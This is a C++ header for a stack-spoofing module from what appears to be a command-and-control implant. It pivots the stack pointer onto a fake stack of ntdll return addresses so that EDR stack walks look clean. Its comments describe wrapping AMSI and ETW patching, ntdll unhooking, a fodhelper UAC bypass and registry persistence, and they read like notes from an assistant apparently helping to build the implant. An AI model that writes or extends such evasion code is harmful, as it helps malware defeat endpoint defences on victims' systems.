// ============================================================================
// stack_spoof.h — Production Stack Spoofing Module
// ============================================================================
// EDRs walk the call stack during syscalls to detect anomalous call chains.
// This module builds a fake call stack populated with legitimate ntdll.dll
// return addresses, pivots RSP before sensitive API calls, and restores
// the original stack afterward.
//
// Integration:
//   1. initStackSpoof() — call once during startup evasion chain
//   2. StackSpoofGuard — RAII guard around virtualProtectDirect /
//      writeMemoryDirect for opt-in per-call spoofing
//
// Architecture:
//   - Ret gadgets: found at runtime in ntdll.dll .text section via PEB walk
//   - Fake stack: 256 bytes (32 frames), allocated once in RX memory
//   - No plaintext API names, no inline assembly (pure bytecode construction)
//   - Compatible with x86_64-w64-mingw32-g++ cross-compilation
// ============================================================================
#pragma once

#ifdef _WIN32
#include <windows.h>

// ============================================================================
// OPAQUE CONTEXT — Internal state, externally opaque
// ============================================================================
// LAYOUT (offsets matter — gate bytecode accesses these by offset):
//   +0x00: fakeStack (void*)       — fake RSP (offset +16 into alloc buffer)
//   +0x08: targetFunc (void*)      — function to call with spoofed stack
//   +0x10: retGadgets[0] (void*)   — first ntdll ret gadget address
//   +0x18: retGadgets[1] (void*)   — ...
//   ...
//   +0x48: retGadgets[7] (void*)   — last ret gadget
//   +0x50: fakeFrameCount (int)    — number of frames in fake stack
//   +0x54: retGadgetCount (int)    — number of gadgets found
//   +0x58: initialized (bool)      — init flag
// ============================================================================
struct StackSpoofContext {
    void* fakeStack;        // +0x00 — fake RSP (offset +16 into allocated buffer)
    void* targetFunc;       // +0x08 — function ptr, set by spoofedCall()
    void* retGadgets[8];    // +0x10 — ntdll ret gadget addresses
    int   fakeFrameCount;   // +0x50
    int   retGadgetCount;   // +0x54
    bool  initialized;      // +0x58
};

// Global context — one per process
extern StackSpoofContext g_spoofCtx;

// ============================================================================
// INITIALIZATION — Call once during evasion setup
// ============================================================================
// Finds ret gadgets in ntdll.dll, builds fake stack.
// Returns true on success.
bool initStackSpoof();

// ============================================================================
// STACK SPOOF GUARD — RAII wrapper for per-call spoofing
// ============================================================================
// Usage:
//   {
//       StackSpoofGuard guard;
//       virtualProtectDirect(addr, size, prot, &old);
//   } // stack restored
//
// The guard saves RSP, switches to the fake stack. When the guard
// is destroyed, RSP is restored to the original value.
// ============================================================================
class StackSpoofGuard {
public:
    StackSpoofGuard();
    ~StackSpoofGuard();

    bool isActive() const { return m_active; }

    // Prevent copying
    StackSpoofGuard(const StackSpoofGuard&) = delete;
    StackSpoofGuard& operator=(const StackSpoofGuard&) = delete;

private:
    void*  m_savedRsp;
    bool   m_active;
};

// ============================================================================
// SPOOFED CALL — Execute a function with the fake call stack
// ============================================================================
// Calls `targetFunc` after pivoting RSP to the fake stack.
// The fake stack has legitimate ntdll addresses pre-loaded, so EDR
// stack walking during the call shows a clean trace.
//
// NOTE: targetFunc receives standard x64 calling convention args.
// The spoof gate saves/restores all registers.
//
// Returns: whatever targetFunc returns (in RAX)
void* spoofedCall(void* targetFunc);

// ============================================================================
// SPOOF_CALL — public macro: invoke a function on the fake call stack
// ============================================================================
// Behavior contract (Windows):
//   if (initStackSpoof() succeeded)
//       Call routed through spoofedCall() — RSP swaps to fake stack,
//       EDR stack-walks observe legitimate ntdll return addresses.
//   else (init failure path)
//       Direct fn() call — IDENTICAL to pre-fix behavior. No protection,
//       but also no regression: baseline flow preserved byte-for-byte.
//
// Behavior (non-Windows builds): #else branch provides direct-call fallback.
//                                  Non-Windows platforms have no fake-stack
//                                  support, so SPOOF_CALL becomes fn().
//
// Why we don't check "gate built" in this macro:
//   g_spoofCtx.initialized is set to true at the END of buildFakeStack(),
//   which runs strictly AFTER buildSpoofGate() returns true (see
//   initStackSpoof in stack_spoof.cpp). Invariant:
//       initialized == true  ⇒  gate was built
//   Checking gateBuilt here would require exposing an extern, coupling
//   the header to an internal flag that the existing init already implies.
//   Single check (initialized) is simpler and equally safe.
//
// Failure-mode footprint (Rule #1 — don't break working flow):
//   - Init succeeded path: same crash risk as the existing gate asm
//     (NOT introduced by this fix; buildSpoofGate untouched).
//   - Init failed path:    byte-identical to pre-fix (no protection,
//     no regression). The unchanged StackSpoofGuard remains a no-op.
//
// Thread-safety: g_spoofCtx.targetFunc is mutated by spoofedCall() without
//   a lock. Current caller (c2_background_thread startup block) is
//   single-threaded. Future reuse from worker threads must per-thread the
//   context — do NOT call SPOOF_CALL concurrently without that update.
//
// Scope discipline (Rule #2 — impact analysis):
//   This fix wraps: unhookNtdll, patchAmsi, patchEtwDeep.
//   INTENTIONALLY NOT WRAPPED:
//     - bypassUac(string)  — takes a std::string (RCX-marshalled out of
//       macro scope). Wrap with `void bypassUacThunk(){bypassUac("");}`
//       if Threat-Model demands EDR bypass around fodhelper.exe launch.
//     - installPersistence() — pure registry writes; per the existing
//       comment in c2_agent.cpp, "Registry writes don't trigger EDR
//       stack tracing" — leaving on real stack is intentional.
//   These are scope decisions, not gaps. Request additional wrapping if
//   desired.
// ============================================================================
#define SPOOF_CALL(fn) do { \
    if (g_spoofCtx.initialized) { \
        spoofedCall((void*)&(fn)); \
    } else { \
        (fn)(); \
    } \
} while(0)

#else
// Non-Windows stubs
inline bool initStackSpoof() { return false; }
class StackSpoofGuard { public: bool isActive() const { return false; } };
inline void* spoofedCall(void*) { return nullptr; }

// Non-Windows SPOOF_CALL: direct call only (no fake-stack support exists)
#define SPOOF_CALL(fn) do { (fn)(); } while(0)
#endif // _WIN32
